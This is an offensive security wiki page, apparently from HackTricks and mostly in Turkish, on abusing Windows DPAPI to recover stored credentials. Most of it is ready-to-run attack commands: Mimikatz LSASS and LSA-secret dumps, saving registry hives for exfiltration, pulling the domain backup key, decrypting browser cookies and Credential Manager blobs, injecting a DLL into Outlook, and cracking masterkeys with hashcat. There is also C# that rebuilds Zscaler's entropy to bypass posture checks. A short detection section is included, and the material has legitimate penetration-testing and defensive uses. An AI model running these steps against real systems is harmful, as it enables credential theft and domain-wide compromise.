# DPAPI - Parolaları Çıkarma

{{#include ../../banners/hacktricks-training.md}}



## DPAPI Nedir

Data Protection API (DPAPI), Windows işletim sisteminde öncelikle **asimetrik özel anahtarların simetrik şifrelenmesi** için kullanılır ve önemli bir entropi kaynağı olarak kullanıcı veya sistem sırlarından yararlanır. Bu yaklaşım, geliştiricilerin kullanıcı oturum açma sırlarından türetilen bir anahtarla veya sistem şifrelemesi için sistemin etki alanı kimlik doğrulama sırlarıyla verileri şifrelemesini sağlayarak şifrelemeyi kolaylaştırır. Böylece geliştiricilerin şifreleme anahtarını korumayı kendilerinin yönetmesi gerekmez.

DPAPI'yi kullanmanın en yaygın yolu, uygulamaların o anda oturum açmış işlemin güvenlik bağlamını kullanarak verileri şifrelemesine ve şifresini çözmesine olanak tanıyan **`CryptProtectData` ve `CryptUnprotectData`** işlevleridir. Varsayılan olarak verilerin şifresi yalnızca şifrelemeyi yapan aynı kullanıcı veya sistem bağlamında çözülebilir.<sup>[[2]](#references)[[3]](#references)</sup>

Bu işlevler ayrıca şifreleme ve şifre çözme sırasında kullanılan isteğe bağlı bir **entropi parametresi** de kabul eder. İsteğe bağlı entropiyle korunan verilerin şifresini çözmek için aynı entropi değeri gerekir.<sup>[[2]](#references)[[6]](#references)</sup>

### Kullanıcı anahtarı üretimi

DPAPI, kullanıcının kimlik bilgilerinden kullanıcıya özgü bir değer (genellikle **ön anahtar** olarak adlandırılır) türetir. Türetme işleminin kesin yöntemi hesaba ve işletim sistemi sürümüne bağlıdır. Örneğin Impacket; parolanın SHA-1 özetini temel alan bir HMAC-SHA1 yöntemi, parolanın MD4/NT hash'ini temel alan başka bir yöntem ve Protected Users için PBKDF2-SHA256 ile türetilen bir yöntem dener. Bu nedenle çevrimdışı araçlar, gerekli materyali genellikle düz metin paroladan veya mevcut bir NT hash'inden türetebilir.<sup>[[2]](#references)[[10]](#references)</sup>

Bu özellikle ilgi çekicidir; çünkü bir saldırgan kullanıcının parola hash'ini ele geçirebilirse şunları yapabilir:

- Herhangi bir API ile iletişim kurması gerekmeden, kullanıcının anahtarıyla DPAPI kullanılarak şifrelenmiş tüm verilerin şifresini **çözebilir**
- Geçerli DPAPI anahtarını üretmek için çevrimdışı olarak **parolayı kırmayı** deneyebilir

DPAPI, korunan her blob için yeni bir ana anahtar oluşturmak yerine her kullanıcı için bir veya daha fazla **ana anahtar** tutar. Her ana anahtarın bir **GUID**'si (Globally Unique Identifier) vardır ve şifrelenmiş blob, kendisini koruyan ana anahtarı belirtir.<sup>[[2]](#references)</sup>

Ana anahtarlar, kullanıcının Security Identifier'ı olan `{SID}` değerini içeren **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** dizininde saklanır. Anahtar dosyasında, kullanıcının **ön anahtarıyla** korunan materyal ve etki alanı kullanıcıları için **etki alanı yedekleme anahtarıyla** korunan kurtarma materyali bulunur.<sup>[[2]](#references)</sup>

Ana anahtarı şifrelemek için kullanılan **etki alanı anahtarının etki alanı denetleyicilerinde bulunduğunu ve hiç değişmediğini** unutmayın. Bu nedenle, bir saldırgan etki alanı denetleyicisine erişebilirse etki alanı yedekleme anahtarını alabilir ve etki alanındaki tüm kullanıcıların ana anahtarlarının şifresini çözebilir.<sup>[[2]](#references)</sup>

Şifrelenmiş blob'ların başlıklarında, içerdikleri verileri şifrelemek için kullanılan **ana anahtarın GUID'si** bulunur.

> [!TIP]
> DPAPI ile şifrelenmiş blob'lar **`01 00 00 00`** ile başlar

Ana anahtarları bulma:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

This is what a bunch of Master Keys belonging to a user will look like:

![What is DPAPI - Users key generation: This is what a bunch of Master Keys belonging to a user will look like](<../../images/image (1121).png>)

### Machine/System key generation

This is the key used by the machine to encrypt data. It's based on the **DPAPI_SYSTEM LSA secret**, which is a special key that only the SYSTEM user can access. This key is used to encrypt data that needs to be accessible by the system itself, such as machine-level credentials or system-wide secrets.<sup>[[2]](#references)</sup>

Note that these keys **don't have a domain backup**, so they are only accessible locally:

- **Mimikatz** can access it by dumping LSA secrets using the command: `mimikatz lsadump::secrets`
- The secret is stored in the registry, so an administrator could **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction from registry hives is also possible. For example, as an administrator on the target, save the hives and exfiltrate them:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Ardından analiz makinenizde hive dosyalarından DPAPI_SYSTEM LSA secret’ını kurtarın ve bunu makine kapsamındaki DPAPI blob’larının (örneğin, makine tarafından korunan uygulama kimlik bilgilerinin veya Wi-Fi profillerinin) şifresini çözmek için kullanın:

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam'e özgü DPAPI örneği:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### DPAPI Tarafından Korunan Veriler

DPAPI tarafından korunan kişisel veriler arasında şunlar bulunur:

- Windows kimlik bilgileri
- Internet Explorer ve Google Chrome parolaları ve otomatik tamamlama verileri
- Outlook ve Windows Mail gibi uygulamaların e-posta ve dahili FTP hesap parolaları
- Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault için parolalar; şifreleme anahtarları da buna dahildir
- Uzak masaüstü bağlantıları, .NET Passport ve çeşitli şifreleme ve kimlik doğrulama amaçları için kullanılan özel anahtarların parolaları
- Credential Manager tarafından yönetilen ağ parolaları ve Skype, MSN messenger gibi CryptProtectData kullanan uygulamalardaki kişisel veriler
- Registry içindeki şifrelenmiş blob'lar
- ...

Sistem tarafından korunan veriler şunları içerir:
- Wi-Fi parolaları
- ...

Zamanlanmış görev parolaları, ayrı bir LSA-secret konusudur. [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) ile kaydedilen bir görev, yerel yönetici/SYSTEM kurtarma amacıyla parola depolayabilir; S4U veya etkileşimli belirteç kullanan bir görev, parola kaydedildiğini göstermez. Görevin sorumlusu ve oturum açma türü, tek başına çalıştırılacağı kullanıcı adından daha güçlü göstergelerdir.

### Master key çıkarma seçenekleri

- Kullanıcının domain admin ayrıcalıkları varsa, domain içindeki tüm kullanıcı master key'lerinin şifresini çözmek için **domain backup key**'e erişebilirler:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Yerel yönetici ayrıcalıklarıyla, bağlı tüm kullanıcıların DPAPI ana anahtarlarını ve SYSTEM anahtarını çıkarmak için **LSASS belleğine erişmek** mümkündür.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- Kullanıcının yerel yönetici ayrıcalıkları varsa, makine master key'lerini çözmek için **DPAPI_SYSTEM LSA secret**'a erişebilir:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- Kullanıcının parolası veya NTLM hash'i biliniyorsa, kullanıcının master key'leri doğrudan **decrypt** edilebilir:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- Kullanıcı olarak bir session içindeyseniz, DC'den **master keys'i decrypt etmek için kullanılacak backup key'i RPC üzerinden** isteyebilirsiniz. Local admin yetkiniz varsa ve kullanıcı oturum açmışsa, onun **session token'ını çalabilirsiniz**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Vault'ları Listeleme

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## DPAPI ile Şifrelenmiş Verilere Erişim

### DPAPI ile Şifrelenmiş Verileri Bulma

Kullanıcıların korunan dosyaları genellikle şuralarda bulunur:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Yukarıdaki yollarda `\Roaming\` yerine `\Local\` kullanmayı da deneyin.

Listeleme örnekleri:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI), dosya sisteminde, kayıt defterinde ve B64 blob'larında DPAPI ile şifrelenmiş blob'ları bulabilir:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Not: Aynı repodaki [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI), cookies gibi DPAPI ile korunan hassas verilerin şifresini çözmek için kullanılabilir.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron için hızlı tarifler (SharpChrome)

- Mevcut kullanıcı için, kaydedilmiş logins/cookies verilerinin etkileşimli olarak şifresini çözme (user context içinde çalıştırıldığında, user’ın Credential Manager’ından ek key’i çözdüğü için Chrome 127+ app-bound cookies ile de çalışır):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Elinizde yalnızca dosyalar varsa çevrimdışı analiz. Önce profilin "Local State" dosyasından AES state key'ini çıkarın, ardından cookie DB'nin şifresini çözmek için kullanın:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- DPAPI etki alanı yedekleme anahtarına (PVK) ve hedef ana bilgisayarda admin yetkisine sahip olduğunuzda etki alanı genelinde/uzaktan triyaj:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- Kullanıcının DPAPI prekey/credkey bilgisine (LSASS'ten) sahipseniz, parola kırmayı atlayıp profil verilerinin şifresini doğrudan çözebilirsiniz:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Notlar
- Daha yeni Chrome/Edge sürümleri, belirli çerezleri "App-Bound" şifrelemesi kullanarak depolayabilir. Bu belirli çerezlerin çevrimdışı şifresini çözmek, ek app-bound key olmadan mümkün değildir; bu anahtarı otomatik olarak almak için SharpChrome'u hedef kullanıcının bağlamında çalıştırın. Aşağıda referans verilen Chrome güvenlik blog gönderisine bakın.<sup>[[5]](#references)</sup>

### Erişim anahtarları ve veriler

- **SharpDPAPI kullanarak** geçerli oturumdaki DPAPI ile şifrelenmiş dosyalardan kimlik bilgilerini alın:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Kimlik bilgisi verilerini alın**; örneğin şifrelenmiş verileri ve guidMasterKey'i.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **masterkey'lere erişim**:

RPC kullanarak **domain backup key** isteyen bir kullanıcının masterkey'ini çözün:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

**SharpDPAPI** aracı, masterkey şifre çözme işlemi için şu argümanları da destekler (`/rpc` ile domain yedekleme anahtarını almak, düz metin parola kullanmak için `/password` veya DPAPI domain private key dosyasını belirtmek için `/pvk` kullanmak mümkündür...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **Bir masterkey kullanarak verilerin şifresini çözme**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

**SharpDPAPI** aracı, `credentials|vaults|rdg|keepass|triage|blob|ps` şifre çözme işlemleri için şu argümanları da destekler (`/rpc` ile domain yedekleme anahtarını almanın, düz metin parola kullanmak için `/password` seçeneğini kullanmanın, DPAPI domain özel anahtar dosyası belirtmek için `/pvk` kullanmanın ve mevcut kullanıcının oturumunu kullanmak için `/unprotect` seçeneğini kullanmanın mümkün olduğuna dikkat edin...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- DPAPI prekey/credkey değerini doğrudan kullanma (parola gerekmez)

LSASS dökümünü alabiliyorsanız Mimikatz genellikle, plaintext parolayı bilmeden kullanıcının masterkey’lerini çözmek için kullanılabilecek oturum açma başına bir DPAPI anahtarını açığa çıkarır. Bu değeri doğrudan araca aktarın:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- **Mevcut kullanıcı oturumunu** kullanarak bazı verilerin şifresini çözün:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Impacket dpapi.py ile çevrimdışı şifre çözme

Kurban kullanıcının SID ve parolasına (veya NT hash'ine) sahipseniz, Impacket’in dpapi.py aracını kullanarak DPAPI masterkey’lerinin ve Credential Manager blob’larının şifresini tamamen çevrimdışı çözebilirsiniz.<sup>[[10]](#references)[[11]](#references)</sup>

- Diskteki artefact’ları belirleyin:
  - Credential Manager blob(ları): %APPDATA%\Microsoft\Credentials\<hex>
  - Eşleşen masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Dosya aktarım araçları güvenilir çalışmıyorsa, dosyaları ana makinede base64’e dönüştürüp çıktıyı kopyalayın:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Kullanıcının SID'si ve parolası/hash'i ile masterkey'i çöz:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Şifresi çözülmüş masterkey'i kullanarak credential blob'un şifresini çözün:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Bu iş akışı, Windows Credential Manager kullanan uygulamalar tarafından kaydedilmiş etki alanı kimlik bilgilerini (yönetici hesapları (`*_adm`) dahil) sıklıkla kurtarır.

---

### İsteğe Bağlı Entropy'nin İşlenmesi ("Third-party entropy")

Bazı uygulamalar `CryptProtectData` işlevine ek bir **entropy** değeri geçirir. Bu değer olmadan, doğru masterkey bilinse bile blob'un şifresi çözülemez. Bu nedenle, bu şekilde korunan kimlik bilgilerini hedeflerken (ör. Microsoft Outlook ve bazı VPN istemcileri) entropy'yi elde etmek çok önemlidir.

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022), hedef süreç içindeki DPAPI işlevlerine hook atan ve sağlanan isteğe bağlı entropy'yi şeffaf biçimde kaydeden bir user-mode DLL'dir. EntropyCapture'ı `outlook.exe` veya `vpnclient.exe` gibi süreçlere karşı **DLL-injection** modunda çalıştırmak, her entropy buffer'ını çağıran süreç ve blob ile eşleştiren bir dosya çıktısı sağlar. Yakalanan entropy, verilerin şifresini çözmek için daha sonra **SharpDPAPI**'ye (`/entropy:`) veya **Mimikatz**'a (`/entropy:<file>`) verilebilir.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Masterkey'leri çevrimdışı kırma (Hashcat & DPAPISnoop)

Microsoft, Windows 10 v1607'den (2016) itibaren **context 3** masterkey biçimini kullanıma sundu. `hashcat` v6.2.6 (Aralık 2023), masterkey dosyasından kullanıcı parolalarının doğrudan GPU hızlandırmalı şekilde kırılmasını sağlayan **22100** (DPAPI masterkey v1 context), **22101** (context 1) ve **22102** (context 3) hash-modes'larını ekledi. Böylece saldırganlar hedef sistemle etkileşime girmeden word-list veya brute-force saldırıları gerçekleştirebilir.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) bu süreci otomatikleştirir:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Araç, Credential ve Vault blob'larını da ayrıştırabilir, bunları kırılmış anahtarlarla çözebilir ve parolaları açık metin olarak dışa aktarabilir.<sup>[[8]](#references)</sup>


### Diğer makinelerdeki verilere erişim

**SharpDPAPI ve SharpChrome** araçlarında, uzak bir makinenin verilerine erişmek için **`/server:HOST`** seçeneğini belirtebilirsiniz. Elbette o makineye erişebilmeniz gerekir. Aşağıdaki örnekte **domain backup encryption key'in bilindiği** varsayılmıştır:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

## Diğer araçlar

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB), LDAP dizinindeki tüm kullanıcıları ve bilgisayarları çıkarmayı ve RPC üzerinden domain controller yedekleme anahtarını almayı otomatikleştiren bir araçtır. Betik daha sonra tüm bilgisayarların IP adreslerini çözümler ve tüm bilgisayarlarda smbclient çalıştırarak kullanıcıların tüm DPAPI blob'larını alır ve domain yedekleme anahtarıyla hepsinin şifresini çözer.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP'ten çıkarılan bilgisayar listesiyle, ağları bilmiyor olsanız bile tüm alt ağları bulabilirsiniz!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI), DPAPI tarafından korunan sırları otomatik olarak dökebilir. 2.x sürümü şunları ekledi:<sup>[[9]](#references)</sup>

* Yüzlerce ana makineden blob'ların paralel olarak toplanması
* **context 3** masterkey'lerinin ayrıştırılması ve otomatik Hashcat kırma entegrasyonu
* Chrome "App-Bound" şifreli çerezleri desteği (sonraki bölüme bakın)
* Yeni bir **`--snapshot`** modu: uç noktaları tekrar tekrar sorgular ve yeni oluşturulan blob'lardaki farklılıkları gösterir

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop), masterkey/credential/vault dosyaları için Hashcat/JtR biçiminde çıktı üretebilen ve isteğe bağlı olarak kırma işlemini otomatik başlatabilen bir C# ayrıştırıcısıdır. Windows 11 24H1'e kadar olan makine ve kullanıcı masterkey biçimlerini tam olarak destekler.<sup>[[8]](#references)</sup>


## Yaygın tespit yöntemleri

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` ve DPAPI ile ilgili diğer dizinlerdeki dosyalara erişim.
    - Özellikle **C$** veya **ADMIN$** gibi ağ paylaşımlarından erişim.
- LSASS belleğine erişmek veya masterkey'leri dökmek için **Mimikatz**, **SharpDPAPI** ya da benzer araçların kullanılması.
- Event **4662**: *Bir nesne üzerinde işlem gerçekleştirildi* – **`BCKUPKEY`** nesnesine erişimle ilişkilendirilebilir.
- Bir işlem *SeTrustedCredManAccessPrivilege* (Credential Manager) istediğinde oluşan Event **4673/4674**.

---
### 2023-2025 güvenlik açıkları ve ekosistem değişiklikleri

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Kasım 2023). Ağ erişimi olan bir saldırgan, domain üyesini kötü amaçlı bir DPAPI yedekleme anahtarını almaya kandırabilir ve böylece kullanıcı masterkey'lerinin şifresini çözebilir. Kasım 2023 toplu güncelleştirmesinde yamalandı. Yöneticiler, DC'lerin ve iş istasyonlarının tüm güncelleştirmeleri aldığından emin olmalıdır.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” çerez şifrelemesi** (Temmuz 2024), eski yalnızca DPAPI korumasının yerine kullanıcının **Credential Manager**'ında saklanan ek bir anahtar getirdi. Çerezlerin çevrimdışı şifresini çözmek artık hem DPAPI masterkey'ini hem de **GCM-wrapped app-bound key**'i gerektiriyor. SharpChrome v2.3 ve DonPAPI 2.x, kullanıcı bağlamında çalışırken ek anahtarı kurtarabilir.<sup>[[5]](#references)</sup>


### Örnek Olay: Zscaler Client Connector – SID'den Türetilen Özel Entropi

Zscaler Client Connector, çeşitli yapılandırma dosyalarını `C:\ProgramData\Zscaler` altında saklar (ör. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Her dosya **DPAPI (Machine scope)** ile şifrelenir; ancak satıcı, diskte saklanmak yerine *çalışma zamanında hesaplanan* **özel entropi** sağlar.<sup>[[1]](#references)</sup>

Entropi iki unsurdan yeniden oluşturulur:

1. `ZSACredentialProvider.dll` içine gömülü, sabit kodlanmış bir sır.
2. Yapılandırmanın ait olduğu Windows hesabının **SID**'si.

DLL tarafından uygulanan algoritma şuna denktir:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Gizli bilgi diskten okunabilen bir DLL içine gömülü olduğundan, **SYSTEM haklarına sahip herhangi bir yerel saldırgan her SID için entropy'yi yeniden oluşturabilir** ve blob'ların şifresini çevrimdışı çözebilir:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Şifre çözme işlemi, her **cihaz duruşu denetimini** ve beklenen değerini içeren eksiksiz JSON yapılandırmasını ortaya çıkarır. Bu bilgiler, client-side bypass girişimlerinde çok değerlidir.

> İPUCU: Diğer şifrelenmiş artefact’lar (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`), DPAPI ile **entropy kullanılmadan** (`16` sıfır bayt) korunur. Bu nedenle SYSTEM yetkileri elde edildikten sonra `ProtectedData.Unprotect` ile doğrudan şifreleri çözülebilir.

## References

- [1] [Synacktiv – Zero trust’ınıza güvenmeli misiniz? Zscaler posture check’lerini atlatma](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI’de güvenlik analizi ve veri kurtarma](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz ve C++ ile DPAPI şifreli sırları okuma](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Güvenlik Açığı](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows’ta Chrome çerezlerinin güvenliğini artırma](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy’nin Basitçe Çıkarılması](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 sürüm notları](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub deposu](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI proje sayfası](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL istismarı, KeePassXC Argon2 kırma ve DC admin’e ulaşmak için DPAPI şifre çözme](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Kullanım ve seçenekler](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
